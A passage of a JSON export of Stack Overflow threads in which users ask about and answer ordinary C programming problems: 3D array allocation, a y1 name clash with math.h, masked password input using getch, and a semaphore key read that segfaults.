"user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e5471902b81d07ea0bd4a1253a2f4455?s=128&d=identicon&r=PG&f=1", "display_name": "Rui Loureiro", "link": "https://stackoverflow.com/users/4744792/rui-loureiro"}, "reply_to_user": {"reputation": 619, "user_id": 1666733, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d588c62cff899e45a7d9fe926b1a0c63?s=128&d=identicon&r=PG", "display_name": "arduic", "link": "https://stackoverflow.com/users/1666733/arduic"}, "edited": false, "score": 0, "creation_date": 1449683292, "post_id": 34185252, "comment_id": 56117353, "body": "Oh I&#39;m sorry, I forgot to post its definition. @arduic"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1449683545, "post_id": 34185252, "comment_id": 56117537, "body": "Running this code with <code>i</code>,<code>j</code>,and <code>p</code> defined as <code>int</code> and <code>x</code>,<code>y</code>, and <code>z</code> defined as int with some default values runs fine with no complaints from Valgrind.  Can you come up with a stand-alone example that still exhibits this issue?  Also, what system / compiler are you using?"}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449683563, "post_id": 34185252, "comment_id": 56117552, "body": "Consider posting code that we can easily compile, this version has missing variable declarations and no <code>main</code>. Anyway I wasn&#39;t able to reproduce the problem; can you show us exactly what you&#39;re doing?"}], "answers": [{"tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": true, "score": 1, "last_activity_date": 1449683681, "creation_date": 1449683681, "answer_id": 34185705, "question_id": 34185252, "link": "https://stackoverflow.com/questions/34185252/dereference-of-undefined-pointer-value/34185705#34185705", "title": "Dereference of undefined pointer value?", "body": "<p>Your code seems correct, though you have a funny way of iterating over the indices. Maybe your compiler got confused. Please try:</p>\n\n<pre><code>for (i = 0; i &lt; x; i++)\n{\n    Parque-&gt;matriz[i] = (char**)malloc(y * sizeof(char*));\n\n    for (j = 0; j &lt; y; j++)\n    {\n        Parque-&gt;matriz[i][j] = (char*)malloc(z*sizeof(char));\n\n        for (p = 0; p &lt; z; p++)\n        {\n            Parque-&gt;matriz[i][j][p]='@';\n\n        }\n\n    }\n}\n</code></pre>\n\n<p>This would be semantically equivalent to you second set of nested loops.</p>\n"}], "owner": {"reputation": 109, "user_id": 4744792, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e5471902b81d07ea0bd4a1253a2f4455?s=128&d=identicon&r=PG&f=1", "display_name": "Rui Loureiro", "link": "https://stackoverflow.com/users/4744792/rui-loureiro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 873, "favorite_count": 0, "accepted_answer_id": 34185705, "answer_count": 1, "score": 0, "last_activity_date": 1449683681, "creation_date": 1449682324, "last_edit_date": 1449683188, "question_id": 34185252, "link": "https://stackoverflow.com/questions/34185252/dereference-of-undefined-pointer-value", "title": "Dereference of undefined pointer value?", "body": "<p>I'm trying to malloc a 3d array and then initialise it, as follows, the problem is, I get a warning saying I'm trying to 'dereference an undefined pointer value' in the following line:                       <code>Parque-&gt;matriz[i][j][p]='@';</code></p>\n\n<p>Any help will be greatly appreciated.</p>\n\n<p>My code is as follows:</p>\n\n<pre><code>parque *Parque;\nParque = (parque *) malloc(sizeof(parque));\n\n\nParque-&gt;matriz = (char***)malloc(x * sizeof(char **));\n\n\n    for (i = 0; i &lt; x; i++)\n    {\n        Parque-&gt;matriz[i] = (char**)malloc(y * sizeof(char*));\n\n        for (j = 0; j &lt; y; j++)\n        {\n            Parque-&gt;matriz[i][j] = (char*)malloc(z*sizeof(char));\n\n        }\n    }\n\n    for (p=0; p&lt;z; p++)\n    {\n        for (j=y-1;j&gt;=0; j--)\n        {\n            for (i=0; i&lt;x; i++)\n            {\n                Parque-&gt;matriz[i][j][p]='@';\n\n            }\n        }\n    }\n</code></pre>\n\n<p>and this is the definition of struct parque:</p>\n\n<pre><code>struct  _parque{\n    int dimx;\n    int dimy;\n    int pisos;\n    int entradas;\n    int acessos;\n    int nodes;\n    char ***matriz;\n    int capacidade;\n    int lugares_ocupados;\n};\n\ntypedef struct _parque parque;\n</code></pre>\n"}, {"tags": ["c", "line", "distance", "point"], "comments": [{"owner": {"reputation": 2068, "user_id": 4028706, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/IdPXD.jpg?s=128&g=1", "display_name": "wgwz", "link": "https://stackoverflow.com/users/4028706/wgwz"}, "edited": false, "score": 2, "creation_date": 1449682322, "post_id": 34185224, "comment_id": 56116773, "body": "You need to post the errors, in snippets and the more important pieces. A bit of a high level overview of your problem also helps the SO community solve your problem as well."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 1, "creation_date": 1449682336, "post_id": 34185224, "comment_id": 56116780, "body": "Please provide sample input, expected output, and observed output."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 3, "creation_date": 1449682549, "post_id": 34185224, "comment_id": 56116907, "body": "<i>What</i> errors?  Is it failing to compile?  Is it crashing?  Is it giving you unexpected output? Are you making sure that the math library is getting linked in properly?"}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 5489234, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-UOTsw55RRys/AAAAAAAAAAI/AAAAAAAAEk4/JRQpfGPhRYA/photo.jpg?sz=128", "display_name": "Simone Calliari", "link": "https://stackoverflow.com/users/5489234/simone-calliari"}, "edited": false, "score": 0, "creation_date": 1449687794, "post_id": 34185921, "comment_id": 56120155, "body": "This is the errors: &quot;redefinition of &#39;y1&#39; as different kind of symbol double x1,y1,m,q,distance;&quot; ; &quot;warning: format specifies type &#39;double <i>&#39; but the argument has type &#39;double (</i>)(double)&#39;&quot; ; &quot;invalid operands to binary expression (&#39;double (*)(double)&#39; and &#39;double&#39;) distance = (fabs (y1 - m * x1 - q)) / (sqrt (1 + m * m)); &quot;"}, {"owner": {"reputation": 77, "user_id": 5489234, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-UOTsw55RRys/AAAAAAAAAAI/AAAAAAAAEk4/JRQpfGPhRYA/photo.jpg?sz=128", "display_name": "Simone Calliari", "link": "https://stackoverflow.com/users/5489234/simone-calliari"}, "edited": false, "score": 0, "creation_date": 1449688327, "post_id": 34185921, "comment_id": 56120437, "body": "I have solved! The problem was the name of the variable y1: I replaced the name with y and it worked! ... But I didn&#39;t understand why..."}, {"owner": {"reputation": 1301, "user_id": 3339818, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bVVg1.jpg?s=128&g=1", "display_name": "surajs1n", "link": "https://stackoverflow.com/users/3339818/surajs1n"}, "reply_to_user": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1449720744, "post_id": 34185921, "comment_id": 56133209, "body": "@stark The error is not in the <code>punto_retta.h</code>. See my edited answer."}], "tags": [], "owner": {"reputation": 1301, "user_id": 3339818, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bVVg1.jpg?s=128&g=1", "display_name": "surajs1n", "link": "https://stackoverflow.com/users/3339818/surajs1n"}, "is_accepted": false, "score": 1, "last_activity_date": 1449721945, "last_edit_date": 1449721945, "creation_date": 1449684415, "answer_id": 34185921, "question_id": 34185224, "link": "https://stackoverflow.com/questions/34185224/c-program-to-calculate-the-distance-between-a-point-and-a-line/34185921#34185921", "title": "C program to calculate the distance between a point and a line", "body": "<p>I guess you were making mistake while calculating the formula for the distance between the point <code>(x1, y1)</code> and the line <code>y = m.x + q</code>.</p>\n\n<p><strong>Replace:</strong></p>\n\n<pre><code>distance = (fabs (y1 - (m * x1 - q))) / (sqrt (1 + m * m));\n</code></pre>\n\n<p><strong>With:</strong> </p>\n\n<pre><code>distance = (fabs (y1 - m * x1 - q)) / (sqrt (1 + m * m));\n</code></pre>\n\n<p><strong>EDIT:</strong> See the reason you kept on getting <em>Compilation Error</em> is because <code>y1</code> has already been declared in <code>math.h</code> Header File. And, I guess if i am not wrong, you must be using C++ compiler to compile your code.</p>\n\n<pre><code>... Rest of the upper code of math.h header file\n_CRTIMP double __cdecl j0 (double);\n_CRTIMP double __cdecl j1 (double);\n_CRTIMP double __cdecl jn (int, double);\n_CRTIMP double __cdecl y0 (double);\n_CRTIMP double __cdecl y1 (double);     // y1 is declared here\n_CRTIMP double __cdecl yn (int, double);\n\n_CRTIMP double __cdecl chgsign (double);\n\n... Rest Code\n</code></pre>\n\n<p><strong>DO:</strong> Change the name of the variable <code>y1</code> to some-thing else in your C program file.</p>\n"}], "owner": {"reputation": 77, "user_id": 5489234, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-UOTsw55RRys/AAAAAAAAAAI/AAAAAAAAEk4/JRQpfGPhRYA/photo.jpg?sz=128", "display_name": "Simone Calliari", "link": "https://stackoverflow.com/users/5489234/simone-calliari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1975, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1449721945, "creation_date": 1449682204, "last_edit_date": 1449686553, "question_id": 34185224, "link": "https://stackoverflow.com/questions/34185224/c-program-to-calculate-the-distance-between-a-point-and-a-line", "title": "C program to calculate the distance between a point and a line", "body": "<p>I have a point <code>(x1, y1)</code> and a line <code>y = m.x + q</code>. And, my task was to find the shortest distance between the given point and the line. </p>\n\n<p>Below is my C code for the same. </p>\n\n<p>Could someone help me with my code, because it gives me a bit of errors <em>(Wrong answers)</em></p>\n\n<pre><code>#include \"punto_retta.h\"\n#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n\ndouble x1,y1,m,q,distance;\n\nint main () {\n\n    printf (\"Enter the coefficient 'm' of the line: \\n\");\n    scanf (\"%lf\", &amp;m);\n    printf (\"Enter the coefficient 'q' of the line: \\n\");\n    scanf (\"%lf\", &amp;q);\n    printf (\"Enter the value of x1: \\n\");\n    scanf (\"%lf\", &amp;x1);\n    printf (\"Enter the value of y1: \\n\");\n    scanf (\"%lf\", &amp;y1);\n\n    distance = (fabs (y1 - (m * x1 - q))) / (sqrt (1 + m * m));\n\n    printf (\"The distance is %.3f \\n\", distance);\n}\n</code></pre>\n"}, {"tags": ["c", "passwords"], "comments": [{"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 0, "creation_date": 1449683289, "post_id": 34185216, "comment_id": 56117351, "body": "What&#39;s the code below for?"}, {"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 0, "creation_date": 1449683524, "post_id": 34185216, "comment_id": 56117518, "body": "You should use <code>getch()</code> for not echoing what was typed, and then <code>putchar(&quot;*&quot;);</code>."}, {"owner": {"reputation": 63, "user_id": 5636956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5267dafbb970551b574b0c066e2c7f14?s=128&d=identicon&r=PG&f=1", "display_name": "Mr ASD", "link": "https://stackoverflow.com/users/5636956/mr-asd"}, "reply_to_user": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 0, "creation_date": 1449683532, "post_id": 34185216, "comment_id": 56117526, "body": "I am trying to program the described program. But i  know it is wrong"}, {"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 0, "creation_date": 1449683569, "post_id": 34185216, "comment_id": 56117558, "body": "So we should try to get that piece of code right?"}, {"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 1, "creation_date": 1449683586, "post_id": 34185216, "comment_id": 56117577, "body": "If so, tell us in the question."}, {"owner": {"reputation": 63, "user_id": 5636956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5267dafbb970551b574b0c066e2c7f14?s=128&d=identicon&r=PG&f=1", "display_name": "Mr ASD", "link": "https://stackoverflow.com/users/5636956/mr-asd"}, "reply_to_user": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 0, "creation_date": 1449683738, "post_id": 34185216, "comment_id": 56117664, "body": "I dont really know if it is right or not. I just should implement a program that gets two characters(but in real i type two numbers) that should match with my password eg. &quot;99&quot;  and the typed password should be with star sign and if 5 times is wrong the can not enter anymore"}, {"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "edited": false, "score": 0, "creation_date": 1449684645, "post_id": 34185216, "comment_id": 56118212, "body": "Added below. You should indent well and remove duplicate blank lines."}], "answers": [{"comments": [{"owner": {"reputation": 63, "user_id": 5636956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5267dafbb970551b574b0c066e2c7f14?s=128&d=identicon&r=PG&f=1", "display_name": "Mr ASD", "link": "https://stackoverflow.com/users/5636956/mr-asd"}, "edited": false, "score": 0, "creation_date": 1449687862, "post_id": 34185924, "comment_id": 56120189, "body": "Here is a small problem,  even if i type the password more then 10 times it still works. Because with continue it goes back and does not check if a&lt;10.What do you think?"}, {"owner": {"reputation": 63, "user_id": 5636956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5267dafbb970551b574b0c066e2c7f14?s=128&d=identicon&r=PG&f=1", "display_name": "Mr ASD", "link": "https://stackoverflow.com/users/5636956/mr-asd"}, "edited": false, "score": 0, "creation_date": 1449688218, "post_id": 34185924, "comment_id": 56120378, "body": "I arranged it, Thank you"}, {"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "reply_to_user": {"reputation": 63, "user_id": 5636956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5267dafbb970551b574b0c066e2c7f14?s=128&d=identicon&r=PG&f=1", "display_name": "Mr ASD", "link": "https://stackoverflow.com/users/5636956/mr-asd"}, "edited": false, "score": 0, "creation_date": 1449703999, "post_id": 34185924, "comment_id": 56128449, "body": "@MrASD Sorry if I didn&#39;t reply rapidly. Is that still a problem now?"}, {"owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "reply_to_user": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1449825976, "post_id": 34185924, "comment_id": 56184182, "body": "@LuisColorado thats the C++ way. He included iostream first, right?"}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1449852005, "post_id": 34185924, "comment_id": 56200566, "body": "@JohnsonSteward, yes, but the question was not tagged C++, just C.  I know what is &lt;cstdio&gt;, but we are (all) messing C and C++ in this question.  And its supposed that answerers know language tricks better than requestors."}], "tags": [], "owner": {"reputation": 493, "user_id": 5520728, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/A7cry.png?s=128&g=1", "display_name": "Johnson Steward", "link": "https://stackoverflow.com/users/5520728/johnson-steward"}, "is_accepted": true, "score": 0, "last_activity_date": 1449876931, "last_edit_date": 1449876931, "creation_date": 1449684428, "answer_id": 34185924, "question_id": 34185216, "link": "https://stackoverflow.com/questions/34185216/getting-an-character-as-a-password-with-sign-and-match-with-your-password/34185924#34185924", "title": "Getting an character as a password with &quot;*&quot; sign and match with your password", "body": "<p>What you want to do is get the char (password) but not echoing it, and put a \"*\" there as a place holder. First is done by <code>getch()</code>, which will not echo. Second is by having a <code>putchar(\"*\")</code> following the input.</p>\n\n<hr>\n\n<p>Here's the possible implementation.</p>\n\n<pre><code>#include &lt;stdio.h&gt; \nint main(int argc, char** argv) \n{ \n    char password; \n    int a = 0;\n    // int a=0, b=0, c, e; \n    do { \n        printf(\"\\nEnter a character\");\n        password=getch();\n        putchar(\"*\");\n        if(password!='1') { printf(\"\\n\\n\"); continue; }\n        password=getch();\n        putchar(\"*\");\n        if(password!='2') { printf(\"\\n\\n\"); continue; }\n        // The password is correct, do something here\n        a++; \n    } while(a&lt;10); \n    return 0; \n} \n</code></pre>\n\n<hr>\n\n<p>Also fixed the indents and blank lines in chaos and removed useless variables. <code>password</code> isn't used elsewhere except as a \"buffer\" for input, so it's OK to override it. You have already compared digit by digit of the password, no need to calculate what it is in decimal and then compare it.</p>\n"}, {"tags": [], "owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "is_accepted": false, "score": 1, "last_activity_date": 1449685232, "creation_date": 1449685232, "answer_id": 34186194, "question_id": 34185216, "link": "https://stackoverflow.com/questions/34185216/getting-an-character-as-a-password-with-sign-and-match-with-your-password/34186194#34186194", "title": "Getting an character as a password with &quot;*&quot; sign and match with your password", "body": "<p>This program should work on Windows but you should know that <code>getch</code> isn't a <code>C</code> standard library, nor is it defined by <code>POSIX</code>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cstdio&gt;\n#include &lt;conio.h&gt;\n\n\nint main (void) {\n    char password[20];\n    int c,i=0;\n    char ch = '*';\n    while ((c = getch()) != '\\n' &amp;&amp; c != EOF){\n        password[i] = (char)c;\n        i++;\n        putchar(ch);\n    }\n\n    printf(\"\\nYour Password is %s\\n\",password);\n    return 0;\n}\n</code></pre>\n\n<p>Any way you could write the function <code>getch</code> yourself like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;termios.h&gt;\n#include &lt;unistd.h&gt;\n\nint getch(void);\n\nint main (void) {\n    char password[50];\n    int c,i=0;\n    char ch = '*';\n    while ((c = getch()) != '\\n' &amp;&amp; c != EOF){\n        password[i] = (char)c;\n        i++;\n        putchar(ch);\n    }\n\n    printf(\"\\nYour Password is %s\\n\",password);\n    return 0;\n}\n\nint getch (void){\n    int ch;\n    struct termios oldt, newt;\n\n    tcgetattr(STDIN_FILENO, &amp;oldt);\n    newt = oldt;\n    newt.c_lflag = newt.c_lflag &amp; ~(ICANON|ECHO);\n    tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt);\n    ch = getchar();\n    tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt);\n\n    return ch;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>michi@michi-laptop:~$ ./program \n******\nYour Password is passwd\n</code></pre>\n\n<p>The <code>getch</code> function needs some fix, but at least you get an Idea.</p>\n"}], "owner": {"reputation": 63, "user_id": 5636956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5267dafbb970551b574b0c066e2c7f14?s=128&d=identicon&r=PG&f=1", "display_name": "Mr ASD", "link": "https://stackoverflow.com/users/5636956/mr-asd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 221, "favorite_count": 0, "accepted_answer_id": 34185924, "answer_count": 2, "score": 0, "last_activity_date": 1449876931, "creation_date": 1449682174, "last_edit_date": 1449683057, "question_id": 34185216, "link": "https://stackoverflow.com/questions/34185216/getting-an-character-as-a-password-with-sign-and-match-with-your-password", "title": "Getting an character as a password with &quot;*&quot; sign and match with your password", "body": "<p>Hello I want to create a program that asks me for a two digit password. I have created the password and the password should match. If the first digit entered is wrong then immidiatly asks one more time , if the first digit is right then is one more left. It should runs just 5 times. If none of this 5 times is right it ends and when I type the password should be as star sign \"*\".</p>\n\n<pre><code>    #include &lt;iostream&gt;\n    #include &lt;conio.h&gt;\n\n\nint main(int argc, char** argv) {\n\n    char password=0x00;\n    int a=0;\n   int b;\n    char password2=0x00;\n    int c,e;\n    do{\n        printf(\"\\nEnter a character\");\n\n        password=getche();\n\n       if(password=='1'){\n\n        b=(passowrd-48)*10;\n\n        password2=getche();\n\n       if(password=='2'){\n\n       c=password2-48;  \n\n      e= c+b;\n       }\n}        \n        a++;\n    }while(e !=12 &amp;&amp; a&lt;10); \n\n        return 0;\n    } \n</code></pre>\n\n<p>Maybe any hint?</p>\n"}, {"tags": ["c", "get", "segmentation-fault", "semaphore"], "comments": [{"owner": {"reputation": 396, "user_id": 5596957, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f27d0deda60ca2443d4b367b0e4bacf?s=128&d=identicon&r=PG&f=1", "display_name": "Duane McCully", "link": "https://stackoverflow.com/users/5596957/duane-mccully"}, "edited": false, "score": 1, "creation_date": 1449683057, "post_id": 34185205, "comment_id": 56117191, "body": "Is there code that shows how the semaphore key is written to the file?"}, {"owner": {"reputation": 13, "user_id": 5660387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c9eac29cfa818faea67a10deb3ffb77?s=128&d=identicon&r=PG&f=1", "display_name": "lubosfukas", "link": "https://stackoverflow.com/users/5660387/lubosfukas"}, "reply_to_user": {"reputation": 396, "user_id": 5596957, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f27d0deda60ca2443d4b367b0e4bacf?s=128&d=identicon&r=PG&f=1", "display_name": "Duane McCully", "link": "https://stackoverflow.com/users/5596957/duane-mccully"}, "edited": false, "score": 0, "creation_date": 1449685238, "post_id": 34185205, "comment_id": 56118610, "body": "I made a script in bash.       #!/bin/bash     semafor=$(sem_get 1)      echo $semafor &gt; idSem.txt"}, {"owner": {"reputation": 396, "user_id": 5596957, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f27d0deda60ca2443d4b367b0e4bacf?s=128&d=identicon&r=PG&f=1", "display_name": "Duane McCully", "link": "https://stackoverflow.com/users/5596957/duane-mccully"}, "edited": false, "score": 0, "creation_date": 1449685349, "post_id": 34185205, "comment_id": 56118676, "body": "So then if you cat the file you just see a number?"}, {"owner": {"reputation": 13, "user_id": 5660387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c9eac29cfa818faea67a10deb3ffb77?s=128&d=identicon&r=PG&f=1", "display_name": "lubosfukas", "link": "https://stackoverflow.com/users/5660387/lubosfukas"}, "reply_to_user": {"reputation": 396, "user_id": 5596957, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f27d0deda60ca2443d4b367b0e4bacf?s=128&d=identicon&r=PG&f=1", "display_name": "Duane McCully", "link": "https://stackoverflow.com/users/5596957/duane-mccully"}, "edited": false, "score": 0, "creation_date": 1449685428, "post_id": 34185205, "comment_id": 56118721, "body": "For example now I enter cat idSem.txt and I get 491522."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 5660387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c9eac29cfa818faea67a10deb3ffb77?s=128&d=identicon&r=PG&f=1", "display_name": "lubosfukas", "link": "https://stackoverflow.com/users/5660387/lubosfukas"}, "edited": false, "score": 0, "creation_date": 1449689045, "post_id": 34186339, "comment_id": 56120811, "body": "I want to open semaphore like this semaphore=${sem_open} Am I doing it right? Because same result segmentation fault."}], "tags": [], "owner": {"reputation": 396, "user_id": 5596957, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f27d0deda60ca2443d4b367b0e4bacf?s=128&d=identicon&r=PG&f=1", "display_name": "Duane McCully", "link": "https://stackoverflow.com/users/5596957/duane-mccully"}, "is_accepted": true, "score": 0, "last_activity_date": 1449685637, "creation_date": 1449685637, "answer_id": 34186339, "question_id": 34185205, "link": "https://stackoverflow.com/questions/34185205/why-do-i-get-segmentation-fault-semaphore-in-c/34186339#34186339", "title": "Why do I get segmentation fault (semaphore in C)?", "body": "<p>Since the file is just plain ascii text, this line will need some extra code:</p>\n\n<pre><code>if (read(sem_fd, &amp;sem_key, sizeof(key_t)) != sizeof(key_t)) {\n</code></pre>\n\n<p>Something like:</p>\n\n<pre><code>char asciiSemKey[20];\nif (read(sem_fd, asciiSemKey, sizeof(asciiSemKey)) &lt; 1)) {\n  /* Do your error stuff here. */\n}\n...\nsem_key = atol(asciiSemKey);\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 5660387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c9eac29cfa818faea67a10deb3ffb77?s=128&d=identicon&r=PG&f=1", "display_name": "lubosfukas", "link": "https://stackoverflow.com/users/5660387/lubosfukas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 568, "favorite_count": 0, "accepted_answer_id": 34186339, "answer_count": 1, "score": 1, "last_activity_date": 1609286669, "creation_date": 1449682161, "last_edit_date": 1609286669, "question_id": 34185205, "link": "https://stackoverflow.com/questions/34185205/why-do-i-get-segmentation-fault-semaphore-in-c", "title": "Why do I get segmentation fault (semaphore in C)?", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/ipc.h&gt;\n#include &lt;sys/sem.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n\n#define SEM_KEY_FILE (\"idSem.txt\")\n\n//sem_open\nint main (int argc, char *argv[]) {\n\nint sem_fd;\nkey_t sem_key;\nint sem_id;\nsem_fd = open(SEM_KEY_FILE, O_RDWR);\nif (sem_fd &lt; 0) {\n    perror(\"Nepodarilo sa otvorit kluc pre citanie\");\n    return 1;\n}\nif (read(sem_fd, &amp;sem_key, sizeof(key_t)) != sizeof(key_t)) {\n    perror(\"Chyba pri citani kluca semafora\");\n    return 2;\n}\nclose(sem_fd);\nsem_id = semget((key_t)sem_key, 0, 0666);\nprintf(\"%d\\n\", sem_id);\nif (sem_id &lt; 0)\n{\n    perror(\"Sada s takymto klucom neexistuje\");\n    return 3;\n}\nprintf(\"%d\\n\", (int) sem_key);\nreturn 0;\n}\n</code></pre>\n\n<p>I create and init semaphore in other c file sem_create. There a sem_key is written to idSem.txt In this file sem_open I want to get sem_key from text file and check if semaphore exist, but I only get segmentation fault because sem_id is -1. Am I doing something wrong?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt; \n#include &lt;sys/ipc.h&gt; \n#include &lt;sys/sem.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\n\nunion semun{\nint val;\nstruct semid_ds *buf;\nunsigned short *array;\nstruct seminfo *__buf;\n};\n\n//sem_create\nint main (int argc, char *argv[]) {\n\nint hodnota = atoi(argv[1]);\nint id;\nsrand((unsigned)time(NULL));\nint kluc;\n\nunion semun sem_union;\nsem_union.val = hodnota;\n\ndo{\nkluc = rand() % 100000;\nid = semget((key_t)kluc, 1, 0666 | IPC_CREAT | IPC_EXCL);\n}while (id == -1);\n\nif (semctl(id, 0, SETVAL, sem_union) == -1)\n    {\n    perror(\"Neuspesne nastavenie hodnoty\");\n    exit(1);\n    return 1;\n    }\nprintf(\"%d\\n\", id);\nreturn 0;   